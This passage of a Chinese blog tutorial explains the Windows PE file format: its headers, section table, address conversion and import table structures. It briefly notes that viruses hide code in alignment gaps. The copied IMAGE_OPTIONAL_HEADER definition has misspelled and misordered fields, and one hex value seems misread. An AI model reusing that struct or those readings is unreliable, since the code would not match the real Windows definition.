<li><p><code>Machine字段</code>：该字段表示可执行文件的<strong>目标CPU类型</strong>。其<strong>具体宏定义</strong>如下：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665032811555.png"></p>
</li>
<li><p><code>NumberOfSection</code>：该字段是 <strong>WORD 类型</strong>，占用 2 个字节。该字段表示 PE 文件的<strong>节表的个数</strong>。</p>
</li>
<li><p><code>TimeDataStamp</code>：该字段表明文件是<strong>何时被创建</strong>的,占4个字节。这个值是自 <strong>1970 年 1 月 1 日</strong>以来用格林尼威治时间计算的秒数。</p>
</li>
<li><p><code>SizeOfOptionalHeader</code>：该字段为 WORD 类型，占用 <strong>2 个字节</strong>。定义<code>IMAGE_OPTIONAL_HEADER</code> 结构体的大小。（在计算位置时，可选头大小需要<strong>通过这个字段获取</strong>而不是使用sizeof)</p>
</li>
<li><p><code>Characteristics</code>：该字段为 WORD 类型，占用 2 个字节。该字段<strong>指定文件的类型</strong>，其具体<strong>宏定义</strong>如下：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665033266212.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665033279655.png"></p>
<hr>
<p>下面我们通过一个<strong>具体的示例</strong>来看一下这些字段的具体含义：</p>
</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665033470473.png"><br>如上图所示，<strong>深色部分</strong>为文件头对应的<strong>20个字节信息</strong>。按照我们上面的介绍来一一对应：</p>
<ul>
<li><code>Machine=014c</code>：表示指定的<strong>CPU为Intel 32</strong>.</li>
<li><code>NumberOfSection=0030</code>：表示<strong>节表个数为0030h</strong></li>
<li><code>TimeDataStamp=618fbe83</code>：表示文件创建时间</li>
<li><code>SizeOfOptionalHeader=00E0</code>：表示<strong>可选头结构体大小为00E0h</strong></li>
<li><code>Characteristics=010F</code>：这个有一点复杂，需要<strong>分解</strong>，最终表示此文件<strong>目标平台为32位</strong>、<strong>不存在重定位信息</strong>、<strong>文件可执行</strong>、<strong>Line nunbers stripped from file</strong>、<strong>Local symbols stripped from file</strong>.</li>
</ul>
<h3 id="可选头详解——IMAGE-OPTIONAL-HEADER"><a href="#可选头详解——IMAGE-OPTIONAL-HEADER" class="headerlink" title="可选头详解——IMAGE_OPTIONAL_HEADER"></a>可选头详解——IMAGE_OPTIONAL_HEADER</h3><blockquote>
<p>不要以貌取人，虽然这个部分叫做可选头，但是却是一个<strong>必须存在的头部</strong>，甚至是PE头三个组成部分中<strong>最重要的部分</strong>,主要是用来<code>管理 PE 文件被操作系统装载时所需要的信息</code><br>可选头的大小在<strong>文件头中已经给出</strong>，其大小为0x00E0 字节（224个字节）。</p>
</blockquote>
<p>还是先给出<code>可选头结构体</code>的<strong>具体定义</strong> (代码较多，不使用截图了）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Optional header format.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.==基础字段</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.===NT 附加字段</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    ajorSubsystemVersion;</span><br><span class="line">    WORD    MMajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>上述结构体可以分为<strong>两个部分</strong>：<code>基础字段</code>与<code>NT附加字段</code>，下面我们会一一介绍。</p>
<h4 id="基础字段–Standard-fields"><a href="#基础字段–Standard-fields" class="headerlink" title="基础字段–Standard fields"></a>基础字段–Standard fields</h4><ul>
<li><code>Magic</code>：该成员指定了<strong>文件的标识</strong>。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665039705441.png"></li>
<li><code>MajorLinkerVersion</code>：<strong>主连接</strong>版本号。</li>
<li><code>MinorLinkerVersion</code>：<strong>次连接</strong>版本号。</li>
<li><code>SizeOfCode</code>：<strong>代码节的大小</strong>，如果有多个代码节的话，该值是所有代码节大小的总和（通常只有一个代码节），该处是指所有包含<strong>可执行属性</strong>的节点大小。</li>
<li><code>SizeOfInitializedData</code>：<strong>已初始化数据块</strong>的大小。</li>
<li><code>SizeOfUninitializedData</code>：<strong>未初始化数据块</strong>的大小。</li>
<li><code>AddressOfEntryPointer</code>：程序<strong>执行的入口地址</strong>。该地址是一个<strong>相对虚拟地址</strong>，简称 EP（EntryPoint），这个值指向了程序第一条要执行的代码。程序如果被加壳后会修改该字段的值，成为壳的入口地址，这样壳代码就有机会先进行执行了。在脱壳的过程中找到了加壳前的入口地址，就说明找到了原始入口点，原始入口点称为 OEP。该字段的地址指向的不是 main函数的地址，也不是 WinMain 函数的地址，而是运行库的启动代码的地址。</li>
<li><code>BaseOfCode</code>：代码节的<strong>起始相对虚拟地址</strong>，也就是RVA。</li>
<li><code>BaseOfData</code>：数据节的<strong>起始相对虚拟地址</strong>，也就是RVA。</li>
</ul>
<h4 id="NT附加字段–NT-additional-fields"><a href="#NT附加字段–NT-additional-fields" class="headerlink" title="NT附加字段–NT additional fields"></a>NT附加字段–NT additional fields</h4><ul>
<li><p><code>ImageBase</code>：文件被装入内存后的<strong>首选建议装载地址</strong>。也就是内存基址，是一个很重要的地址量，可以用于后面的地址转换。</p>
<blockquote>
<p><strong>注解</strong>：打开 OD 后，OD 停留在第一行的反汇编代码处就是 <code>AddressOfEntryPoint+ImageBase</code> 的值，OD 在打开被调试程序后，数据窗口默认显示的位置是<code>BaseOfData+ImageBase</code> 的值。<br>对于 <code>EXE 文件</code>而言，所有的<strong>相对虚拟地址加ImageBase</strong> 后，就得到了<strong>虚拟地址</strong>；对于 <code>DLL</code>而言，在其装入内存后，就需要通过重定位表修正相关的地址信息。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665041263432.png"></p>
</blockquote>
</li>
<li><p><code>SectionAlignment</code>：节表数据被装入内存后的<strong>对齐值</strong>,也就是节表数据被映射到内存中需要<strong>对齐的单位</strong>。在 Win32 下，通常情况下，<strong>内存对齐的该值为 0x1000 字节</strong>，也就是 4KB 大小。Windows 操作系统的内存分页一般为 4KB，这样做的原因是在切换时速度会快。</p>
</li>
<li><p><code>FileAlignment</code>：节表数据在<strong>文件中的对齐值</strong>。通常情况下，该值为 <strong>0x1000 字节或 0x200字节</strong>。在文件对齐为 0x1000 字节时，由于与内存对齐值相同，可以加快操作系统对可执行文件装载入内存的速度。而文件对齐值为 0x200 字节时，可以占用相对较少的磁盘空间。<strong>0x200字节是 512 字节，通常磁盘的一个扇区即为 512 字节</strong>。</p>
<blockquote>
<p><strong>注解</strong>：<strong>地址对齐</strong>也是一个很重要的知识点。程序无论是在内存中还是磁盘上，都无法恰好满足 SectionAlignment 和 FileAlignment 值的倍数，在不足的情况下编译器会<strong>自动地进行补 0</strong>，这样就导致节数据与节数据之间存在着为了对齐而<strong>存在的大量的 0 空隙</strong>。这些空隙对于病毒之类的程序而言就有了可利用的价值，病毒通过搜索空隙而将<strong>病毒代码进行植入</strong>，从而在不改变文件大小的情况下感染文件。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665043373565.png"></p>
</blockquote>
</li>
<li><p><code>MajorOperatingSystemVersion</code>：要求最低操作系统的<strong>主版本号</strong>。</p>
</li>
<li><p><code>MinorOperatingSystemVersion</code>：要求最低操作系统的<strong>次版本号</strong>。</p>
</li>
<li><p><code>MajorImageVersion</code>：可执行<strong>文件</strong>的主版本号。</p>
</li>
<li><p><code>MinorImageVersion</code>：可执行<strong>文件</strong>的次版本号。</p>
</li>
<li><p><code>Win32VersionValue</code>：该成员变量是被保留的。</p>
</li>
<li><p><code>SizeOfImage</code>：可执行文件<strong>装入内存后的总大小</strong>。该大小<code>按内存对齐方式</code>对齐。</p>
</li>
<li><p><code>SizeOfHeaders</code>：整个 <strong>PE 头部的大小</strong>。这个 PE 头部指 <strong>DOS 头、PE 头、节表</strong>的总和大小。该大小<code>按照文件对齐方式</code>进行对齐。（也可以说是PE文件中<strong>数据结构的大小</strong>）</p>
</li>
<li><p><code>CheckSum</code>：<strong>校验和值</strong>。对于 EXE 文件通常为 0；对于 SYS 文件（驱动文件、内核文件），则必须有一个校验和。用于校验文件是否被修改。</p>
</li>
<li><p><code>SubSystem</code>：可执行文件的<strong>子系统类型</strong>,具体如下<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665042178617.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665042197812.png"></p>
</li>
<li><p><code>DllCharacteristics</code>：指定 <strong>DLL 文件的属性</strong>。<br> <img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665042343931.png"></p>
</li>
<li><p><code>SizeOfStackReserve</code>：为线程<strong>保留的栈</strong>大小，以<strong>字节为单位</strong>。</p>
</li>
<li><p><code>SizeOfStackCommit</code>：为线程已<strong>提交的栈</strong>大小，以<strong>字节为单位</strong>。</p>
</li>
<li><p><code>SizeOfHeapReserve</code>：为线程<strong>保留的堆</strong>大小。</p>
</li>
<li><p><code>SizeOfHeapCommit</code>：为线程<strong>提交的堆</strong>大小</p>
</li>
<li><p><code>LoadFlags</code>：<strong>保留字段</strong>，必须为 0。MSDN 上的原话为“This member is obsolete”，说是一个废弃的字段。但是该值在某些情况下还是会被用到的，比如针对原始的低版本的 OD 来说，修改该值会起到反调试的作用。</p>
</li>
<li><p><code>NumberOfRvaAndsize</code>：数据<strong>目录项的个数</strong>。</p>
</li>
<li><p><code>DataDirectory</code>：<strong>数据目录表</strong>，由 <code>NumberOfRvaAndSize</code> 个 <code>IMAGE_DATA_DIRECTORY</code>结构体组成的数组。</p>
</li>
</ul>
<blockquote>
<p><strong>注解</strong>：该数组包含<code>输入表</code>、<code>输出表</code>、<code>资源</code>、<code>重定位</code>等<strong>数据目录项</strong>。每一个数组元素都是一个结构体，其包含：<code>VirtualAddress</code>和<code>Size</code>两个字段，前者为目录项的RVA,后者为目录项大小。<br>对于数据目录中的具体数据，并<strong>不包含在可选头</strong>中，只是可选头提供了<strong>相应数据的相对虚拟地址</strong>，具体数据目录中的内容在后面的内容中将进行介绍。</p>
<blockquote>
<p><strong>附表</strong>：数据目录在<strong>数组中的索引</strong>如下图：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665043103626.png"></p>
</blockquote>
</blockquote>
<h2 id="节表详解——IMAGE-SECTION-HEADER"><a href="#节表详解——IMAGE-SECTION-HEADER" class="headerlink" title="节表详解——IMAGE_SECTION_HEADER"></a>节表详解——IMAGE_SECTION_HEADER</h2><blockquote>
<p><strong>节表</strong>中的每个<code>IMAGE_SECTION_HEADER</code> 中都存放着可执行文件被<strong>映射到内存</strong>中所在位置的信息，节的<br>个数由 <code>IMAGE_FILE_HEADER</code> 中的 <code>NumberOfSections</code> 给出。下面我们具体进行介绍。</p>
</blockquote>
<p>首先给出<code>IMAGE_SECTION_HEADER</code>结构体的定义：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665044708729.png"><br>此结构体大小为<strong>40字节</strong>，其<strong>成员变量</strong>的介绍如下：</p>
<ul>
<li><code>Name</code>：该成员变量保存着<strong>节表项的名称</strong>，节表项的名称用 ASCII 编码来保存。表项的名称长度是 8 个 ASCII 字符。</li>
</ul>
<blockquote>
<p><strong>注解</strong>：节表项的<strong>名称可以随意地改变</strong>，甚至可以删除掉，因此不能以节表项的名称作为依据判断节中保存的内容，也不能通过节表项的名称判断加壳的种类。</p>
</blockquote>
<ul>
<li><code>VirtualSize</code>：该值为<strong>节数据实际的大小</strong>，该值不一定是对齐后的值，该字段的值在某些情况下可以为 0。这里的大小不是对齐之后的数据。</li>
<li><code>VirtualAddress</code>：该值为该<strong>节区数据装入内存后的相对虚拟地址（RVA)<strong>，这个地址是</strong>按内存对齐</strong>的。该地址加上 IMAGE_OPTIONAL_HEADER 结构体中的 <code>ImageBase</code> 才是内存中的<strong>虚拟地址(VA）</strong>。</li>
<li><code>SizeOfRawData</code>：该值为该<strong>节区数据在磁盘上的大小</strong>，该值是<strong>按照文件对齐</strong>进行对齐后的值，但是也有例外。</li>
<li><code>PointerToRawData</code>：该值为该节区在<strong>磁盘文件上的偏移地址</strong>。</li>
<li><code>Characteristics</code>：该值为该<strong>节区的属性</strong>。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665045204604.png"></li>
</ul>
<h1 id="三种地址及转换"><a href="#三种地址及转换" class="headerlink" title="三种地址及转换"></a>三种地址及转换</h1><h2 id="三种地址详解"><a href="#三种地址详解" class="headerlink" title="三种地址详解"></a>三种地址详解</h2><ul>
<li><code>VA</code>：<strong>虚拟内存地址</strong>。是在虚拟内存空间的实际地址，也就是PE 文件被 Windows 加载到内存后的地址。</li>
<li><code>RVA</code>：<strong>相对虚拟内存地址</strong>。PE 文件虚拟地址相对于<strong>映射基地址</strong>（对于 EXE 文件来说，映射基地址是 IMAGE_OPTIONAL_HEADER 的 ImageBase 字段的值）的<strong>偏移地址</strong>。</li>
<li><code>FOA</code>：<strong>文件偏移地址</strong>，相对于 PE 文件在<strong>磁盘上文件开头</strong>的偏移地址。</li>
</ul>
<h2 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>当 <code>FileAlignment</code> 与 <code>SectionAlignment</code> 的<strong>值不相同</strong>时，磁盘文件与内存文件映像的同一节表数据在磁盘和内存中的<strong>偏移也不相同</strong>。当 <code>FileAlignment</code> 与 <code>Section Alignment</code> 的<strong>值相同</strong>时，如果存在类似<code>.data?</code>节的话，磁盘文件与内存映像的同一节表数据在磁盘和内存中的<strong>偏移也不相同</strong>。<br>这样两个偏移就发生了一个需要转换的问题。当知道某数据的 RVA，希望在文件中读取同样的数据的时候，就必须将 RVA 转换为 FOA，反之，也同样的情况。</p>
<p>我们可以通过<strong>PEditor工具</strong>查看某PE文件的<strong>地址信息</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665046534448.png"></p>
<h3 id="相同对齐值的地址转换"><a href="#相同对齐值的地址转换" class="headerlink" title="相同对齐值的地址转换"></a>相同对齐值的地址转换</h3><p>对齐值相同的情况下，地址的转换就很简单了，大概分为以下两步。</p>
<ol>
<li>将 VA（虚拟地址）转换为 RVA（相对虚拟地址），即 RVA &#x3D; VA – ImageBase。</li>
<li>将RVA(相对虚拟地址)转换为FOA(文件偏移地址)，即RVA&#x3D;FOA。</li>
</ol>
<blockquote>
<p><strong>注意</strong>：<br>① 上面的例子使用的是 <strong>EXE 文件</strong>进行演示，对于 DLL 的话，DLL 的装载地址并不是 <strong>IMAGE_OPTIONAL_HEADER</strong> 结构体中的 <code>ImageBase</code> 字段。因此不能按照上面的方式转换，需要得到具体的 DLL 文件装载到内存中的起始位置。<br>② SectionAlignment 和 FileAlignment 相同时，也存在 RVA 和 FOA 不同的情况，比如存在data?时，文件本身没有空间但是在内存中有预留空间，这就导致偏移不同。</p>
</blockquote>
<h3 id="不同对齐值的地址转换"><a href="#不同对齐值的地址转换" class="headerlink" title="不同对齐值的地址转换"></a>不同对齐值的地址转换</h3><p>如果对齐值不同的话，地址的转换就要复杂一些。在介绍具体的转换公式之前，我们先来说一下对齐值对地址的影响到底是怎么样的。</p>
<blockquote>
<p><code>IMAGE_OPTINAL_HEADER</code> 中<strong>FileAlignment</strong> 和 <strong>SectionAlignment</strong> 两个字段的值确定了文件对齐值和内存对齐值。而对齐值则会导致<strong>节的起始位置</strong>不同。前面我们介绍了PE文件的结构，可以将其分为<strong>数据结构</strong>和<strong>节表数据</strong>两部分，其中数据结构又可以分为<strong>DOS头、PE头、节表</strong>，而这些数据加起来一般也不会超过512个字节，也就是<strong>在一个对齐值</strong>之内，之后就要<strong>补0至对齐值或者对齐值的倍数</strong>。而后<strong>不同节表数据</strong>都是占据对齐值倍数的空间，换句话说，<strong>每一个节表数据都是从一个新的对齐值空间开始的</strong>。</p>
<blockquote>
<p>实例如下：不同节的起始虚拟偏移都是对齐值的整数倍。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665115198591.png"></p>
</blockquote>
</blockquote>
<p>通过上面的介绍，下面我们给出<strong>FOA与VA的具体转换公式</strong>：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">某数据的 <span class="attribute">FOA</span>=该数据所在节的起始 FOA+（某数据的 RVA–该数据所在节的起始 RVA）</span><br></pre></td></tr></table></figure>

<p>这也很好理解，因为<strong>每一个节（区段）都是从一个新的对齐值空间开始</strong>的，就是这个节只有1个字节也会补0至对齐值倍数。所以我们首先需要知道要转换的<strong>RVA所在节的起始FOA</strong>，之后计算<strong>内存偏移</strong>（转换处相对于节头）再<strong>加和</strong>即可得到实际FOA。</p>
<p>同样的，<strong>FOA转换为RVA的公式</strong>如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">某数据的<span class="attribute">RVA</span>=该数据所在节的起始RVA+(某数据的FOA-该数据所在节的起始FOA)</span><br></pre></td></tr></table></figure>

<h3 id="通过工具直接转换"><a href="#通过工具直接转换" class="headerlink" title="通过工具直接转换"></a>通过工具直接转换</h3><p>很多PE编辑工具都带有地址转换的功能，以PEditor为例</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665115438383.png"></p>
<h1 id="数据目录相关结构详解"><a href="#数据目录相关结构详解" class="headerlink" title="数据目录相关结构详解"></a>数据目录相关结构详解</h1><blockquote>
<p>前面我们介绍了PE文件中一些基本的数据结构，但是还有一些与PE结构相关的结构体<strong>不在PE的头部</strong>，而是在各个节数据里。它们的位置由 <code>IMAGE_OPTIONAL_HEADER 结构体</code>中的 <strong>DataDirectory 数组</strong>（数据目录）给出相应的<strong>RVA和Size</strong>。</p>
</blockquote>
<p>数据目录有很多，<strong>一般是16个</strong>。下面我们会选择其中较为重要的几个进行介绍。</p>
<h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><blockquote>
<p>导入表是 PE 数据组织中的一个很重要的组成部分，它是为<strong>实现代码重用</strong>而设置的。通过<strong>分析导入表数据</strong>，可以获得诸如 PE 文件的指令中<strong>调用了多少外来的函数</strong>，以及这些外来函数都<strong>存在于哪些动态链接库</strong>里等信息。</p>
</blockquote>
<p> Windows 加载器在运行 PE 时会<strong>将导入表中声明的动态链接库DLL一并加裁到进程的地址空间</strong>，并修正指令代码中<strong>调用的函数地址</strong>。</p>
<h3 id="导入表的查看"><a href="#导入表的查看" class="headerlink" title="导入表的查看"></a>导入表的查看</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665283959691.png"><br>通过PEditor打开hello.exe，而后选取目录按钮就看看到此文件对应的数据目录信息。通过上图可见，hello.exe 文件在执行时需要<strong>装载 2个 DLL 文件</strong>，分别是 <code>user32.dll</code>和 <code>kernel32.dll</code> 两个动态链接。该 EXE 文件在每个 DLL 文件又<strong>使用了若干个函数</strong>。对于 PE 文件而言，调用的其他模块的函数称为“<code>导入函数</code>”。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665284275807.png"></p>
<p>如上图，<code>MessageBoxA</code>就是一个<strong>导入函数</strong>，被hello.exe调用。但是若是相对于<code>user32.dll</code>来说，此函数就是一个<strong>导出函数</strong>。</p>
<h3 id="导入表的结构"><a href="#导入表的结构" class="headerlink" title="导入表的结构"></a>导入表的结构</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665916481929.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665918249607.png"></p>
<p>上图是<code>导入表</code>在磁盘和内存中的<strong>基本框架</strong>，有<strong>3个关键结构体</strong>：</p>
<ul>
<li>IMAGE_IMPORT_DESCRIPTOR</li>
<li>IMAGE_THUNK_DATA</li>
<li>IMAGE_IMPORT_BY_NAME</li>
</ul>
<p><strong>IMAGE_IMPORT_DESCRIPTOR的结构体</strong>定义在 <code>Winnt.h</code> 头文件中，它的<strong>定义如下</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span> </span><br><span class="line"> <span class="class"><span class="keyword">union</span> &#123;</span> </span><br><span class="line"> DWORD Characteristics; </span><br><span class="line"> DWORD OriginalFirstThunk; </span><br><span class="line"> &#125;; </span><br><span class="line"> DWORD TimeDateStamp; </span><br><span class="line"> DWORD ForwarderChain; </span><br><span class="line"> DWORD Name; </span><br><span class="line"> DWORD FirstThunk; </span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p>该结构体的名字叫<code>IMAGE_IMPORT_DESCRIPTOR</code>，有<strong>5个字段</strong>组成，其具体含义如下：（20个字节）</p>
<ul>
<li>OriginalFirst<strong>Thunk</strong>：该字段保存了指向导入函数名称（序号）的 RVA 表，这个表其实是<br>一个 IMAGE_THUNK_DATA 结构体。</li>
<li>Name：指向导入模块名称的 RVA</li>
<li>First<strong>Thunk</strong>：该字段保存了指向导入地址表的 RVA。<blockquote>
<p><strong>上字段解释</strong>：<code>OriginalFirstThunk字段</code>保存了指向导入函数名称（序号）的 RVA 表，这个表其实是<br>一个 <strong>IMAGE_THUNK_DATA 结构体</strong>。<code>FirstThunk字段</code>在 PE 文件没有被装载前的内容OriginalFirstThunk 指向相同的内容，也就是在 PE 文件没有被装载前它也指向 <strong>IMAGE_THUNK_ DATA 结构体</strong>。当被Windows 操作系统<strong>装入内存后</strong>，它的值则发生了变化，被装载入内存后，这里<strong>保存了导入函数实际地址</strong>。</p>
</blockquote>
</li>
</ul>
<hr>
<p><strong>IMAGE_THUNK_DATA 结构体</strong>的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span> </span><br><span class="line"> <span class="class"><span class="keyword">union</span> &#123;</span> </span><br><span class="line"> 	DWORD ForwarderString; <span class="comment">// PBYTE</span></span><br><span class="line">   DWORD Function; <span class="comment">// PDWORD </span></span><br><span class="line"> 	DWORD Ordinal; </span><br><span class="line">	DWORD AddressOfData; <span class="comment">// PIMAGE_IMPORT_BY_NAME </span></span><br><span class="line">      &#125; u1; </span><br><span class="line">&#125; IMAGE_THUNK_DATA32; </span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>

<p><strong>IMAGE_THUNK_DATA 结构体</strong>中关键字段如下：（4个字节，一个地址）</p>
<ul>
<li><strong>Oridinal</strong>：导入函数的序号，当 IMAGE_THUNK_DATA 的<strong>最高位为 1</strong> 时，该值有效。</li>
<li><strong>AddressOfData</strong>：指向 <strong>IMAGE_IMPORT_BY_NAME 结构体</strong>的 RVA，当 IMAGE_THUNK_ DATA 的<strong>最高位不为 1</strong> 时，该值有效。</li>
</ul>
<blockquote>
<p><strong>上结构体解析</strong>：<br><code>Oridinal</code> 和 <code>AddressOfData</code> <strong>本质上是一个值</strong>，但是在使用时取决于 IMAGE_THUNK_DATA 的最高位。当 <strong>IMAGE_THUNK_DATA 的最高位为 1</strong> 时，使用的是<strong>序号进行导入</strong>的函数，导入函数的序号为Oridinal 的低 31 位；当<strong>最高位不为 1</strong> 时，说明导入函数是通过<strong>名称进行导入</strong>的，而 AddressOfData 保存了指向 IMAGE_IMPORT_BY_NAME的 RVA。</p>
<blockquote>
<p>通过 IMAGE_THUNK_DATA 结构体，可以<strong>了解导入函数是通过序号还是名称导入</strong>的。<br>如果是通过序号进行导入，那么导入序号可以在 IMAGE_THUNK_DATA 中获得；如果是通过名称导入，那么就需要借助 IMAGE_IMPORT_BY_NAME 来得到导入函数的名称</p>
</blockquote>
</blockquote>
<hr>
<p><strong>IMAGE_IMPORT_BY_NAME 结构体</strong>的定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span> </span><br><span class="line"> 	WORD Hint; </span><br><span class="line">	BYTE Name[<span class="number">1</span>]; </span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Hint</strong>：该字段表示该函数在导出函数表中<strong>导出函数名称对应的序号</strong>，该值不是必需的；</li>
<li><strong>Name</strong>：该字段表示<strong>导入函数的函数名称</strong>。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665920279211.png"></p>
<h3 id="导入表整体概述"><a href="#导入表整体概述" class="headerlink" title="导入表整体概述"></a>导入表整体概述</h3><ol>
<li><p>在PE扩展头最后有一个数据目录数组，其中每一个元素都是结构体，大小为8个字节，按顺序存储各个数据目录描述表（结构体）的大小和RVA。其中第二个元素就是导入表的地址和大小。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665968236503.png"><br>如图所示，导入表的RVA为00002018H，大小为3CH。一个描述表结构体大小为20个字节，所以3C&#x2F;20&#x3D;3，也就是说导入了3个模块。（实际是2个模块，还有一个是全0，用于表示结束）</p>
</li>
<li><p>接下来我们进入一个实际文件来看一下这个描述表<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665969821895.png"><br>如图所示，我使用竖线将其分为了三个部分，分别对应导入表里的三个导入模块。下面我们选择第一个模块(user32.dll)进行跟踪。</p>
<blockquote>
<p>注意：这里的一个模块为20个字节，分为5个字段，我们需要关注的是第一个字段和最后一个字段，前者为INT（导入函数名称表），后者为IAT(导入函数地址表)。这里地址分别为00002054h与00002008h，各自指向一个结构体（在静态和动态中指向的地址存储的数据不同）</p>
</blockquote>
</li>
